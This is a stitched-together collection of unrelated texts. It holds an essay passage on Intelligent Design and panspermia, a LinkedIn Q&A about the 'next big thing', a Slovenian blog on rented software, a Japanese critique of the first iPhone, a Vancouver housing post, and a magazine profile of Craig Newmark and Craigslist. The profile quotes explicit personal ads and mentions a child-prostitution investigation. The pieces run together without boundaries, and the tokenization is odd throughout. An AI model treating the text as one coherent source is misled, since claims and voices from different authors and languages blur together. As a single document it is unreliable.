Panspermia was trotted out for the “ Scopes II ” trial in the 1980s , when Fred Hoyle and Chandra Wickramasinge were among the few first - rank scientists to openly disbelieve the standard Origins model — the one that posits life appeared independently out of nonliving chemicals in Earth ’s early oceans .
Their calculations ( since then refuted ) suggested that it would take hundreds of oceans and many times the age of the Earth for random chemistry to achieve a workable , living cell .
Alas for the Creationists of that day , Hoyle and Wickramasinge did not turn out to be useful as friendly experts , because their alternative offered no comfort to the biblical Genesis story .
They pointed out that our galaxy probably contains a whole lot more than a few hundred Earth oceans .
Multiplying the age of the Milky Way times many billions of possible planets — and comets too — they readily conceded that random chance could make successful cells , eventually , on one world or another .
( Or , possibly , in the liquid interiors of trillions of newborn comets . )
All it would take then are asteroid impacts ejecting hardy cells into the void for life to then spread gradually throughout the cosmos .
Perhaps it might even be done deliberately , once a single lucky source world achieved intelligence through … well … evolution .
( Needless to say , Creationists found Hoyle & Wickramasinge a big disappointment . )
So far , we have amassed quite a list of legitimate competitors … that is , if Intelligent Design is one .
Now a cautionary pause .
Some alternative theories that I have left out include satirical pseudo - religions , like one recent internet fad attributing creation to something called the “ Flying Spaghetti Monster . ”
These humorous jibes have a place , but their blows do not land on - target .
They miss the twin pillars of completeness and fair play , upon which promoters of Intelligent Design have based their attack against secular - modernist science .
By erasing all theological details , they hoped to eliminate any vulnerabilities arising from those details .
Indeed , since the Spaghetti Monster is purported to be an Intelligent Designer , they can even chuckle and welcome it into the fold , knowing that it will win no real converts .
Not so for the items listed here .
Each of these concepts — adding to idea - space completeness and deserving fair play — implies a dangerous competitor for Intelligent Design , a competitor that may seduce at least a few students into its sphere of influence .
This undermines the implicit goal of ID , which is to proselytize a fundamentalist / literalist interpretation of the Christian Bible .
There are other possibilities , and I am sure readers could continue adding to the list , long after I am done , such as …
We ’re living in a simulation …
We ’ve been resurrected at the Omega Point …
It ’s all in your imagination … and so on .
I doubt that the promoters of Intelligent Design really want to see a day come when every biology teacher says : “ Okay , you ’ve heard from Darwin .
Now we ’ll spend a week on each of the following : intelligent design , guided evolution , intelligent design of intelligent designers , evolution of intelligent designers , the Hindu cycle of karma , the Mayan yuga cycle , panspermia , the Universe as a simulation … ” and so on .
Each of these viewpoints can muster support from philosophers and even some modern physicists , and can gather as much supporting evidence as ID .
In any case they are all equally defensible as concepts .
And only censoring bullies would prevent students from hearing them and exercising their sovereign right to decide for themselves , right ?
Or , perhaps , they might even start private sessions after school , to study the science called … biology .
A day may come when the promoters of Intelligent Design wish they had left well enough alone .

Any ideas about the " Next Big Thing ? "
The Internet had a great ten - year run .
It 's time for something new .
What will be the products , ideas or services that will have an impact on the future and will change our lives ?
Q&A
WoW
My expectation of the " office of the future " would be a room just inside your own house , with videowalls all around .
You'd be able to " meet " your collegues , clients and suppliers without having to physically move more than the 15 feet from your living room .
One of the reason 's it is not there today , is lack of bandwith ; this will be solved .
The other problem is response time : it does take some time for light to travel from New York to Bombay , and this small timelapse ( say 20 000 km , 300 000 km / sec == > 0,067 seconds delay ) might a reason meeting face - to - face will stay for another few centuries .

... bi bil nekakšen pimeren naslov za vprašanje , ki sem ga zasledil na Linked In povezava ( žal povezava deluje samo za vpisane v servis ) Dogradili so servis in dodali vanj še Vprašanja in odgovore .
Vsak prijavljen ima mesečno na voljo nekaj vprašanj , ki jih lahko zastavi ostalim uporabnikom .
Malo preverjam pa so kar zanimivi .
Ni se še čisto skristaliziralo , ampak se mi zdi Linked In dobro okolje zaspletno strukturo .
Prav zaradi tega poslovnega priokusa , ki ga pa premore , bodo mogoče vprašanja manj butasta in odgovori bolj strokovni .
Je pa vprašanje dejansko zanimivo in prav tako odgovori .
Še posebej za tiste , ki se ukvarjajo s tehnologijo , ki iščejo velike poslovne priložnosti , ali pa samo čakajo na najnovejšo igračo .
Po naše bi bilo to " programska oprema kot storitev " .
Gre nekako v smeri najemanja programske opreme in ne več za kupovanje le-te .
Ne kupiš več dragega programskega paketa , ampak najameš obstoječega in še to na spletu .
Ne greš čez dolge procedure inštalacije , ne vzdržuješ in ne nadgrajuješ , ampak plačaš in uporabljaš .
Ne kupiš več najnovejše igre , ampak jo najameš za določen čas .
Tole me spomni na .
Čisto mogoče , da nas bodo takšne storitve preplavile , v končni fazi se že dogaja .
Razgrajevanje materialov na atome in grajenje novih stvari .
Reciklaža v pravem pomenu besede .
Ločevanje odpadkov bo samo še stvar preteklosti .
Meni se zdi daleč , ampak upam , da bom lahko videl in uporabljal vsaj v osnovni različici .
Mi je pa zelo simpatična vizija za naslednjo naslednjo veliko stvar :
Nekako je za pričakovati , da se bodo zaradi hitrejših medmrežnih povezav razvilo veliko video konferenčnih storitev .
S tem pa bi se dalo tudi pričakovati velik razmah virtualnih pisarn .
To se že dogaja , mogoče pa obstaja tudi možnost za " office of the future " .
なんだ かApple信者のたてるノイズが多すぎて、冷静に判断できない雰囲気。
でも、iPhoneの存在自体は秘密でもなんでもなかったし、全面タッチスクリーンのデザインも「第6世代iPod」として何度も流出している。こういうのが出るのはとっくに想像していたわけで、いささか騒ぎすぎだろうし、奇襲に成功とは思えないな。二本指が使えるUIだってMacに搭載済みだし。
で、仮に今使って る 「 W32SA + W - ZERO3 + iPod shuffle 」 をiPhoneで置き換える( 値段的に釣り合いがとれる置換案だろう)ことを冷静に考えてみたら、まだまだ欲しいと思わせるだけの出来ではないと思えてきた。
手探りで操作できな い
余計なものがなにひとつ付いていない、相変わらず魅力的で所有欲をそそられるデザインはすばらしい。が、画面を見ないと何もできないということでもある。これってけっこう不便。
最近、朝の電車で乗り過ごすのを避けるために、8:26にバイブレータのアラームをかけているんだけど、止めるときは服の上から携帯のボタンをちょんと触るだけである。ポケットの中ではおそらく自動的にセンサーが切れるiPhoneではこれができない(※)。緊急時に、ポケットの中で手探り110番することもできない。
かつ てPDAと言えば全面タッチスクリーンというのが当たり前だったが、pilot( Palm)がその常識を覆して、最小限のボタンが非常に有用であることを示した。Jobsはボタンをふたたび否定したけど、Palm育ちのおれとしては、ボタンは必要だと思うのだな。iPod shuffleだって、しょっちゅう手探りで操作してるし。
あと、タッチスクリーンはフィードバックに乏しいので、文字入力が遅くなる。たとえ女子高生でも。それを補うためにうんと賢い予測変換を入れてもらいたいものだが、今回のiPhoneにはまだ増井テクノロジーが未搭載なので、たぶんまだまだショボいだろう。これも待ち要因になる。
※ツッコミにも書いたが、ボタンが1個だけあるのを失念していた(知らなかったわけではない)。その意味ではこの例は不適切。個人的には、初代pilotと同じ、4個ないし5個のボタンが必要だと思う。この数はいみじくも、Apple唯一の「手探りデバイス」であるiPod shuffleが持つボタン数にほぼ等しい。
GPS がない
GSM ではない日本での動向が気になるところだが、そんなもん、3社( WILLCOM入れて4社?)が競い合って対応させてくれと頼みに行っているところだろう。心配はいらないと思う。
ただし、3G端末で定額料金にしてもらわないと話にならない。そして、今年から3G端末はGPSを搭載すべしということになっている。ということは、今回発表になったiPhoneはGPSを搭載していないという理由で国内販売はなさそう、ということになる。
もっとも 、( auユーザとしては ) GPSを搭載していない端末なんてありえないと思うくらい、GPSは便利なものなので、そういう意味で今回のiPhoneには魅力がない。ぐだぐだ言ってないで最初から搭載しとけよ、と思う。
唯一の選択肢 はGPSを搭載しなくてもいいWILLCOMから出ることだが……どうだろう。そうなるとauを手放せないことになるから、ちょっと困るな。
アプリを追加できな い
インタビューによれば、iPhoneにはユーザアプリを追加できない。なぬー!?
なんのためにMacOS Xを搭載したのよ。
現在使ってい るW - ZERO3に搭載されてい るWindows Mobileは、はっきりいって最低最悪のOSだ。他に選択肢がないからしかたなく使っている。だから、オルタナティブなOSを乗せた端末が出てくれれば、乗り換えるだけの強力な理由になる。
OS Xが載っているなら、当 然RubyCocoaで自作ソフトを……って流れになるじゃないか。それができない!?
ありえん。だったら、(標準ではダメダメながら)有志が作ったソフトウェアのおかげでなんとか使い物になっているWindows Mobileの方がまだ夢があるってもんだ。
ともかく 、Windows Mobileは、ホントにホントにホントにホント〜〜にどうしようもないOSなので、Appleにはがんばって欲しいと思う。でも、もうちょっとなんとかしてくれないと買えない。
Check it out !
If you bring cash this house will only cost you $ 462,000 ..
You might even get a deal as the seller is ‘ motivated ’ since at least April or so .
It brings in $ 1450 per month in rent too !
Can you make those numbers work ?
I used the ever handy mortgage calculator to discover that if you put 5 % down you ’ll need an annual income of $ 157,631 to buy this house , so it ’s quite the status symbol .
And yet some people claim that Vancouver is in the peak of a bubble .
pshaw !

The Exploder of Journalism and I have an appointment at noon at a café near the Haight in San Francisco , and he ’s right on time in the Kangol hat .
To be honest , he ’s not much to look at : short and balding , with a little smile and round cheeks with bright - pink patches of color .
Modish glasses .
Weighing in at 210 in briefs ( yes , I asked ) .
He says hello to Nico ( the dog ) and Steve and Misha behind the counter , then I follow him to the back terrace , where the Exploder gets down on all fours to give Bob , a white cat , some fish treats from his pack .
He wipes his hands on his black jeans .
“ Cat saliva .
Maybe that ’s why I ’m allergic . ”
His phone rings .
It quickly becomes clear that he ’s talking to law enforcement , and they ’re trying to nail a child - prostitution case .
The Exploder , who believes in good citizenship , is telling a prosecutor how to subpoena Internet - service providers ’ info on bad guys , and how much he wishes they had artificial intelligence to help out .
He pauses and rolls his head back , a sure sign that a joke is coming .
“ Unfortunately , our artificial intelligence is not that good , and when it is , it will kill us and take over , and then we ’ll have to send someone back in time to kill us , and Arnold Schwarzenegger is n’t good at that anymore … ”
Ha-ha .
The Exploder of Journalism has a hokey sense of humor forged by Oedipal issues ; the life sentence inside the short , round body ; and seventeen years at IBM , where managers crapped on him and did not recognize that underneath that pink - cheeked , abrasive demeanor was an action figure called the Exploder of Journalism .
“ Let ’s go now .
My bladder is full — ”
He has to stop in at Radio Shack , then get to his job in customer service ( do n’t all geeks who took the buyout from IBM ? ) .
I want to hail a cab , but this goes against his code , so we wait for the 43 bus .
Being short makes it easier for the Exploder to deal with the bus ’s lurching and swaying on the hills of San Francisco .
He sets his feet apart and his briefcase on the floor and surfs the bus like the nebbish superhero he is .
When we get off , he leans in close .
I brace myself for the warm breath of a personal confidence .
“ That ’s good till 2:30 . ” He touches my transfer slip .
“ They wo n’t check you on the trains ; they might on the buses . ”
Roger .
Up some stairs to his office .
A huge guy at a computer that looks like a modular couch and appears to be running a nuke plant swings around in his chair .
He ’s got a plate in one earlobe , almost a dish .
I ’m afraid to see what else .
“ Hi , Craig , ” he says sweetly .
All right , yes — it is .
It is Craig .
In the past few months , I and countless others in the mainstream media have awakened to the fact that something we thought was benign and even modestly beneficial , if we happened to have a room to rent or something to sell , was in fact a wild beast , loose in the orchards .
Craigslist.org is changing everything .
A simple and free online classified - ad service started by the gnomish Craig Newmark in San Francisco eleven years ago , Craigslist is ( a ) where young urban people conduct much of the traffic of their lives , including renting apartments , finding lost pets , and getting laid in the middle of the day , and is ( b ) thereby destroying classified revenues for big -city newspapers , which are already in crisis , and so it has become ( c ) the symbol of the transformation of the information industry .
Rocked in a Bay Area cradle of left - wing values , Craigslist has built a huge national community by word of mouth .
The site is free and without advertising ( with the exception of help - wanted ads in three markets ) , and it gets more than 3 billion page views per month ( 10 million actual users a month ) , ranking it seventh on the Net , not so far behind Google and eBay .
Craigslist ’s largest category is New York apartments , where it posts more than half a million listings a month .
Yes , half a million ( many of these repeats ) .
The soul of the site is expressed by the simple populist formulation that Craig Newmark states over and over again when he is asked about his purpose : “ We are just trying to give people a break . ”
Users throng the site not only because it is free , fast , and stripped - down but because of the communitarian values flowing from the founder .
In refusing to take the business public or to sell any display advertising , Newmark has “ stepped away from many millions , ” he says .
Maybe billions .
His users all know that .
The site ’s only income is the $ 75 per listing for job posters in San Francisco , and $ 25 per listing in New York and Washington , D.C. , earning a sum estimated by Fortune to be $ 20 million a year .

Civil meltdowns like 9/11 and Katrina have only built that community .
During the transit strike , Scott Anderson , a blogger for the Tribune Company , noticed with sadness that the ride - share space on Newsday.com , a Tribune holding , was empty while Craigslist was going crazy with offers .
“ Yet another crisis and Craigslist commands the community , ” he wrote .
“ How come Craig organically can touch lives on so many personal levels — and Craig ’s users can touch each other ’s lives on so many levels ?
It ’s just frustrating that even when we [ newspapers ] try , we more often than not find we are absolutely losing what may be one of the most important parts of the business as it more and more moves online — the ability to connect people to one another and to activate conversations .
To not just be the deliverer of news and information … but the catalyst of connection . ”
Craig is not content to merely eat away at the business model of newspapers by chewing up their classifieds , from back to front .
He ’s also begun issuing vague pronouncements about citizen journalism , the people — his people — taking the news into their own hands .
“ I ’m working with some folks on technologies that promise to help people find the most trusted versions of the more important stories , ” Craig said on his blog , further spooking the old - media types .
Newmark has invested in a Website headed by Jeff Jarvis , a longtime journalist and blogger — “ to organize the world ’s news using the best of technology , community , and editors , ” he wrote on his blog .
Jarvis says the site will be up in the spring and aims to help newspapers redefine themselves at a time when the journalism world is shattering .
At media conferences , Newmark introduces himself by saying that he does customer service at Craigslist , and gets a laugh .
But then he is seated beside Arthur Sulzberger Jr. ( “ I ’ve … enjoyed his company , ” the publisher told me in an e-mail ) and is photographed making jokes with Martha Stewart .
During one of my meetings with him , Newmark broke off to take a call from a business magazine that apparently wanted to picture him destroying a newspaper .
“ That would be hurtful to people .
I do n’t want to do that .
I do n’t want to do anything undignified . ”
This month , Newmark will be in New York to take part in a real - estate conference at which he will talk about a proposed $ 10 fee per ad to try to tame the traffic on the apartments site ( the volume is actually a problem for him , because many of the ads are either repeats or scams ) , even as a new film called 24 Hours on Craigslist opens this month at the Pioneer in the East Village .
He will also drop in on some real - estate brokers ’ offices .
“ The usual response is panic , followed by photography , ” he says .
“ Somebody whips out a camera .
Often several cameras . ”
“ You ’re a celebrity , ” I say .
“ Not a celebrity .
I ’m a guy who may or may not exist .
I want to assure all your readers that I do n’t exist .
I ’ll add , as a bonus joke for all the physics nerds , I exist in a state of quantum superposition , simultaneously existing and nonexisting . ”
The celebrity is a by - product of the large social powers that Newmark and his even more idealistic CEO , Jim Buckmaster , have unleashed for the list ’s true adherents , struggling urbanites .
“ My whole life is based around it , ” says Rachel Beider , a 22 - year - old photographer on the Lower East Side .
“ It ’s my only source .
I use Craigslist for my apartment , for finding roommates , to get my cat , come to think of it — for everything . ”
Her statements are seconded by a 59 - year - old artist on the Upper East Side who has gotten roommates , sold furniture , joined a singing group , and hired a computer repairman “ for $ 5 and a Coke ” through the list .
“ I feel like it ’s revolutionary what Craig is doing , ” she says .
“ I have isolationist tendencies , and for someone like myself , this has been a huge miracle . ”
The only thread in Newmark ’s autobiography is social isolation .
“ I was academically smart , emotionally stupid , ” he says .
“ I ca n’t read people , and I take them too literally . ”
Although Craigslist does no marketing surveys , the “ power user ” of the site is someone who ’s not settled , who ’s looking to fill basic needs .
And this intense use of the site gives it its small - town feeling .
In December , a Boston woman who had left her iPod on the Orange Line promptly posted on Craigslist and soon got the player back , after describing her playlist to the man who had found it .
About the same time , a woman in South San Francisco lost her dog and posted repeatedly on the list before she got a call from a worker at the Moss Rubber Company .
“ Even though my dog had a microchip , the real savior was posting to Craigslist , ” the dog owner wrote , “ where everyone goes when looking for something . ”
Rachel Beider misplaced her destiny .
A few months back , she exchanged eye contact with a tall blond guy on the train , then got off before either of them could say a word .
She went home and posted “ To the cute blond guy on the L Train ” in the Missed Connections category .
Within hours , Daniel Atwood had e-mailed her to ask , “ What were you listening to ? ” “ Azure Ray . ”
This month , she and Atwood are going to India and Southeast Asia together for several months .
“ Do you know how hard it is to meet vegetarian guys ? ”
Among media mandarins , the list began to resonate a year ago , after a business study in the Bay Area showed that local newspapers were losing as much as $ 50 million a year in revenue to Craigslist .
The awareness of the trend has since avalanched .
Classifieds make up as much as 50 percent of big-city newspaper ad revenues , explains newspaper analyst John Morton , and at a time when the newspaper industry is in crisis , with circulations going down by as much as 2.6 percent a year as readers die off and the young go elsewhere for their information , Craigslist has gotten a reputation as the newspaper killer .
At the convention of the American Society of Newspaper Editors last spring , two panelists at a session on the crisis in the industry flashed a slide of Newmark and asked the editors how many of them knew who Craig Newmark was .
A faint show of hands .
Craigslist ?
A few more .
“ The shocking thing is that this was someone who was not only a threat to steal their business but was in the process of doing it , ” says Jay Rosen , a blogger ( the name of his blog is PressThink ) and professor of journalism at NYU .
“ What industry could survive in which you do n’t know the name of the person who is taking away your business ?
They ’re mystified .
They do n’t know who this guy is and where he came from .
And it just shows — that it ’s easier for Craig to learn journalism than it is for these guys to learn the Web . ”
From a business standpoint , this may be the most revolutionary aspect of the Craigslist model :
It took what had long been defined as a profitable industry — classifieds — and demonstrated that it is not much of a business at all , but is rather what open - source advocates call “ a commons , ” a public service where people can find one another with minimal intervention from their minders .
Even so , the revenues from the tiny portion of ads Craigslist charges for are so considerable that Microsoft and Google and eBay have all come up with competitors or have announced plans to do so .
Newsmen have not observed the rise of Craigslist without comment .
The SF Weekly ( itself once the venue for hip classifieds ) lately attacked the site as “ craig$list . ”
And Al Saracevic , a business columnist for the San Francisco Chronicle , issued a challenge to Newmark : “ You should n’t take the money and run … [ You ] need to give something back to society other than cheap apartment ads and funny , dirty personals . ”
And even though the amount of money Newmark is taking from the list is modest , Newmark said , “ Al ’s right . ”
That was last spring .
Chronicle editor Phil Bronstein says he is still waiting for an answer from Newmark .
It ’s hard to escape the sense that the architects of the new media are less likely to be Bronstein ’s ( and my ) crowd of ink-spotted kids who grew up reading the Pentagon Papers and All the President ’s Men than they are to be tech nerds like the Craigslist people .
“ Jim and Craig are engineers , ” says Bronstein .
“ I ’m an editor .
I ’m paid to make choices .
My work still has meaning — but does it have value ? ”
It is a paradox ( but a logical one when you consider it ) that a great social innovation came out of a great social disability .
Craig Newmark is one of the most socially impaired people to be found this side of a high - school reunion .
Yet he is also an extrovert who thrives on seeing and talking to others .
And this large need , hooked onto his extreme deficit , is really the only reason that Craigslist is now in 190 cities around the world .
Craig was born in December 1952 , the first son of a salesman ( of insurance and meat , among other things ) and a bookkeeper mother who had met three years before at a synagogue dance .
The setting was Morristown , New Jersey , but Newmark likes to say that he grew up in “ Nerdistan . ”
Science fiction was his literature , and by 13 he had formed his lifelong ambition : Master quantum physics .
“ That supplanted dinosaurs . ”
The two large psychological facts of the Newmark family seem not to have registered at all .
His father , Leon Newmark , died of cancer shortly after the boy ’s bar mitzvah .
What effect did this have ?
“ I think probably nothing .
I may be very wrong .
I do n’t know of any effect . ”
And what about Joyce Newmark ’s struggle to raise two boys — did that shape the man whose only principle of action for the past ten years has been to give other people a break ?
“ I do n’t know .
I know single moms do n’t get a break , which is part of the motivation for our child - care category .
But I do n’t know if it relates to my own childhood .
Our memories are treacherous , and we suppress things .
I had some developmental issues .
Being a nerd , I had some problems getting along with other kids . ”
The only thread in Newmark ’s autobiography is social isolation .
“ I was academically smart , emotionally stupid .
I ca n’t read people , and I take them too literally , ” he confesses .
In classrooms , he says , he experienced “ tiny amounts of anti-Semitism , ” but quickly amends that .
“ Frankly , any problems related to prejudice I faced may be because I was a show - off about academic stuff , raising my hand and answering questions .
Or because I ’m short .
Five seven . ”
In high school , he fell in love with the computer , and when he got to Case Western Reserve in Cleveland , he designed his own curriculum in computer science .
It was also at Case Western that in his sophomore year he had an epiphany .
Looking around the room in a communications class , he realized that not everyone had a communications problem , only he did .
“ It had to be me .
I had difficulty communicating with most people . ”
Cut to Detroit , and Boca Raton , and seventeen years in the IBM hinterlands as a systems engineer .
Newmark was “ mistreated by managers , ” says Anthony Batt , a friend .
Newmark demurs .
“ Some of them were trying to help me , and I did n’t get it .
Occasionally , I was probably a bit of an asshole .
I had difficulties dealing with people . ”
Everything changed in 1993 .
He moved to San Francisco to work for Schwab , and the city ’s spirit of personal experimentation and techie progressivism made him feel home at last .
He joined the Well , the pilgrim colony of idealists on the Web that struggled with issues of free speech and intellectual property , led by Stewart Brand , whose koan was “ Information wants to be free . ”
He was part of the Linux - inspired open - source movement , which looked on Microsoft as so much vinyl - siding tract housing on the Net ’s sweeping landscape .
And he entertained himself at events like the Anon Salon and Joe ’s Digital Diner .
“ I learned that storytelling is important , ” he says .
Newmark is more practical than egghead , but the Well ’s discussions of Internet community engaged him at his core .
He saw people giving hours of time to one another without compensation , including professionals helping people in emergencies ; he wanted to take part .
So in 1995 , he began sending out a list of techie events and opportunities to friends .
Internet jobs , apartments , lectures .
Just ten or twelve people at first .
But the list grew .
Within a few months , his list cracked the e-mail ceiling on CCs , 240 , and so had to move to a listserv , and he had to give it a name .
A word about Newmark ’s friends .
He lacks interpersonal skills ; he does n’t connect .
“ He ’s much more comfortable in e-mail than in person - to - person contact , ” says programmer Weezy Muth .
It struck me that he can barely distinguish between one human integer and another .
On the evening following our first meeting , of four hours , Newmark failed to recognize me when I came up and introduced myself at a lecture to which he had directed me .
“ Bill , did you say ? ”
Then in the hall , he threw himself down two seats away from me .
He compensates for his clumsiness with the trick of trying to memorize first names .
But these spray out like robotic data points , and the one - size - fits - all party talk that ensues paralyzes all within earshot .
But back to the hero ballad .
Newmark wanted to call the listserv SF - events .
“ To hell with that , do n’t make it fancy , just keep it Craigslist , ” Batt said — it ’s what everyone calls it anyway .
The list passed a million page views a month , and Newmark was using PERL - based code that converted e-mails to Web pages so that he could instantly publish friends ’ ads .
Microsoft Sidewalks ( a now - defunct city - by - city Web network ) approached him about running ads on the site .
He said no .
But he incorporated as a for - profit in 1999 , quit his day job , and gave away a 25 percent share of ownership to a staffer , Phillip Knowlton , in the belief that Craigslist was a community trust that belonged to everyone .
Besides , he says , he thought that if he owned the whole thing , he might develop a fat head and get “ middle - aged crazy . ”
Like its founder , the site had a straight and unpretentious look , without graphics , like an early Internet application .
This may be Newmark ’s genius .
He expresses himself with a simple , naïve - sounding fervor : “ The purpose of the Internet is to connect people to make our lives better . ”
In 1999 the dot - bomb hit , and in 2000 , amid the wreckage , Newmark made his most important hire , Jim Buckmaster , a shy , black - haired programmer fully a foot taller than Newmark who had been working at a dead start - up called Creditland .
Raised a Methodist in West Virginia , the son of a research chemist and a musician , Buckmaster is a deeply serious intellectual who had drifted for years in the left - wing demimonde : a “ permastudent , ” he says , in Ann Arbor , grazing from medical school to Latin and ancient Greek ; an ascetic , sleeping on the floor of communal houses and grinding his own wheat to make bread ; and a futurist , teaching himself unix programming and then building the Internet gateway for a vast social - sciences archive maintained at the University of Michigan .
The coding skills were his ticket to Silicon Valley , where he commuted two and a half hours by bus each way to a job in Milpitas , reading Chomsky in pocket editions that looked like postage stamps in his big hands .
Buckmaster has never owned a car .
His disdain is at once phobic ( “ I do n’t feel safe in them ” ) and political ( “ You see what the automobile imposes on everyone in society , regardless of whether they drive or not …
If every single person on the Earth had an automobile , that would be an ecological Armageddon that the Earth would not recover from ” ) .
Buckmaster would never have invented Craigslist .
But — picture Henry Ford redesigned by Ralph Nader — it was he who took the simple machine Newmark had invented and put it on the road for everyone .
The site was limited to San Francisco .
Buckmaster launched it in Boston in June 2000 and two months later in New York , Chicago , L.A. , Seattle , and Washington , D.C. Then on to 34 countries .
When he came on , every posting had to be manually reviewed and approved by a staffer .
Buckmaster implemented a self - posting system , in which a user sends himself an e-mail and approves the listing , whereupon it is published .
He expanded the categories to include child care , political and legal discussion forums , the Missed Connections list , and , in the interest of plainness , the heading Men Seeking Sex .
That could not stand .
After a week , Newmark , a devotee of Sex and the City , came up with the title Casual Encounters .
And Buckmaster wrote the error - message haikus that zap a user who , say , tries to resubmit the same posting in a discussion forum :
a wafer thin mint
that ’s been sent before it seems
one is enough , thanks
He also set up a flagging system so that offensive posts would automatically be removed through a type of group consensus — again , users proceeding without adult supervision .
“ We try to get out of the way and make changes in the site to let people better accomplish what they seem to want to accomplish , ” Buckmaster says — the list ’s democratic mantra .
After only eleven months on the job , Newmark made Buckmaster his president and CEO .
Where Newmark is goofy and chatty , Buckmaster is shrewd and courtly .
He reads the Wall Street Journal and Fortune , and appears , unruffled if unshaven , in jeans and a zip - up sweater from which his bony wrists jut like sticks , at the front door of the dilapidated Victorian house that Craigslist occupies , to answer the three camera crews that show up after it ’s reported that the list is featuring ads for dangerous pit bulls by explaining the site ’s policy against selling animals ( a policy sometimes abrogated , by , among others , my sister ) .
“ CEO .
That ’s never a title I expected to have , ” Buckmaster , 43 , says with a slightly perplexed look .
“ My father ’s proud .
He has drawn attention to the fact that for so long I was a sandal - wearing , bike - riding , Chomsky - reading , tofu- making hippie , and here I am a CEO .
There ’s not really a comeback . ”
“ If you try to run something similar to us and subtract the sincere mission and philosophy or , worse , try to fake it , I ’m sure that ’s not going to work , ” says Buckmaster .
The towering and intimidating CEO is Mr. Inside , while the soft and fuzzy bite - size founder is the icon .
Newmark works customer service full - time ( my impression is that ’s fragmented time , in between feeding Bob the cat ; cooing at babies in cafés ; meeting Nick Lampson , a Democrat who wants to run against Tom DeLay ; and going to dinners of Stewart Brand ’s Long Now Foundation ) and does the green room , perfecting an interview shtick that has roots in Poor Richard ’s Almanack .
“ The only times I ’ve been in a limo I do n’t want to be … ”
“ I do n’t believe in logic .
I believe in reasoning and common sense .
Logic is often misleading because logic is not human or humane . ”
“ My problem is that in the last decade , against my wishes , I have acquired a little bit of taste . ”
“ If you look at the example of my fellow nerds , once you have a comfortable living , then it ’s more satisfying to change the world than to make money …
Also , we nerds tend to be less interested in fancy cars or weird comb - forward hair . ”
Buckmaster and Newmark sometimes differ .
Newmark was uncomfortable about having a purple peace sign as the Craigslist favicon , Buckmaster went ahead and wrote the code , and now Newmark is okay with it .
Their passion is essentially the same .
Buckmaster ’s face wrenches in suppressed feeling when he states that there were 40 workstations set up at the Superdome in New Orleans for 20,000 people .
Working thousands of miles away , Craigslist sought to shorten the lines in the Astrodome by changing its listing format , so that its page of 100 listings by headline would appear as 100 digested listings , including contact info , so that printouts could be passed around and dozens of offers considered at once .
When the Red Cross balked at handling offers of help on Craigslist , on liability grounds , Buckmaster did n’t even bother to call the agency .
“ We saw the comments in the press , and it caused me in my mind to group the Red Cross with fema as a backward bureaucracy that is getting long in the tooth and possibly not up to the problem at hand , ” he says .
“ It ’s a very naïve reaction , and a five - or ten - year - old fear :
We ca n’t trust something off the Internet . ”
The founder ’s light spirit percolates through the list — his absence of judgment , his openness , his desire to be amused , his indifference to the profit motive .
Dedicated users troll the list at work for gossip or laughs , and they trust that when they offer up their souls on the list , they will gain understanding , or an audience .
Consider this anonymous screed — in the Rants and Raves category — from a Washington , D.C. , woman maybe hoping her lover would n’t see it :
“ You cannot trick me , Small Penis , into thinking you are large — by pounding away like a jackhammer .
In fact , when you do this — I almost totally forget about you …
It is true , Smally , that when I first saw you I did not get that certain rush of glee and pupil dilation that a giant cock will cause .
I have small breasts — when I take off my shirt ( I do n’t even need a bra ) I am sure I am not providing a moment that would be filmed in glorious slow motion with a soundtrack .
Small Penis , small tits are subtle .
You can be too .
You will never fill me in that ‘ good lord YES ’ amusement - park ride way — but , remember — that is one slice of the spectrum . ”
Of course , sex has always powered the Internet , and Craigslist hath many turbines .
When it showed up in London two years ago , there was a media storm over the Casual Encounters list , with its frank opportunities for adultery .
The Erotic Services category is a fairly straightforward list of purveyors of prostitution , who are , presumably , pleased to be freed from any reliance on pimps .
“ This is something that was traditionally left up to science fiction , ” says Michael Ferris Gibson , director of 24 Hours on Craigslist .
“ In Logan ’s Run [ made in 1976 ] — which they ’re remaking this year — a guy comes home and gets on his computer and says , ‘ I really feel like having a date . ’
All these different women manifest .
They teleport in .
You also see this in sixties Utopian science fiction : relationships that were very transient and enabled by technology , and some people would say it has a hedonistic vibe to it .
Well , using a system like Craigslist , it ’s real . ”
Yes , people also get married on Craigslist , and in Gibson ’s movie , but with the list ’s phenomenal growth , its Northern California book of virtues is sure to bump up against conservative sensibilities .
“ Do my laundry , get a blowjob … , ” a 28 - year - old in Boston posted recently .
She then went on with perfect pitch for American sales speech : “ I ’ve got what ’s about 8 - 12 loads in the corner of my room ( my laundry hamper is SO overflowed ) .
I ’ve got the washer , the dryer , detergent , and all that .
I just do n’t actually want to do it …
If you fuck up a load , well I ’m a fan of getting things done right , so you ’ll either wash & dry them again , or you wo n’t get rewarded .
I ’ve got Wednesday off from work , or I guess Sunday could be laundry day . ”
Or consider Kate , a 25 - year - old Manhattanite , for whom Craigslist was a bust when she sought a room ( people who post rooms “ think they ’re very easy to live with ” ) but was great when she sought “ sane , like - minded ” men for — the term of art — NSA relationships .
“ I wanted to find someone who would meet my terms — that is , a nice person who wanted to have safe sex with No Strings Attached , ” she told me in an e-mail .
“ I posted W4M [ woman for man ] , and got 200 responses in ten minutes ; I was completely floored by it ! …
I responded to about ten of these , and ended up meeting with four men overall , and having sex with three .
I found it very easy to establish ‘ ground rules ’ and limits , because I had no intention of ever seeing these people again .
It was very freeing ! …
It ’s so hard for most women to go out and demand what they want in the bedroom .
I think Craigslist can help to change that . ”
When I showed that e-mail to Newmark , he said that the list reflects “ basic American values , and freedom of choice could n’t be any more basic . ”
He also likes to say that there is no real contradiction between the basic values of people in red and blue states , or the West and Islam ( or in Israel and the Palestinian territories , where he has supported the group One Voice ) .
This struck me as somewhat softheaded , Newmark ’s everybody - is - good doxology .
The only Muslim city on the site is Istanbul .
Some have abused the freedoms Newmark has afforded them .
The child - prostitution case was a grisly one in Martinez , California , where a 22 - year - old mother who is said to have advertised her own services on the list is being investigated for taking an offer for $ 500 to have sex with her 4 - year - old daughter .
Newmark assisted the police , as he has assisted New York law enforcement in tracking down apartment scams .
Newmark says he spends half his time in customer service dealing with these scams .
The $ 10 listing fee should help a great deal with this problem .
The money itself does n’t interest Newmark .
But it ca n’t hurt .
Even if the number of New York listings were to fall to a tenth of their present number , that ’s another $ 550,000 a month .
Buckmaster wo n’t confirm the figure .
“ We make very good livings , and the company ’s business is very successful , ” he says .
“ We ’ve had the luxury of doing well and being able to follow a moral compass and not have much conflict between the two .
There has n’t been the luxury of doing that in other businesses .
What ’s going to come along to drop your business cost by ten - or one - hundredfold in the steel industry ? ”
He and Newmark can be called extravagant by no American measure .
Newmark ’s car is four years old .
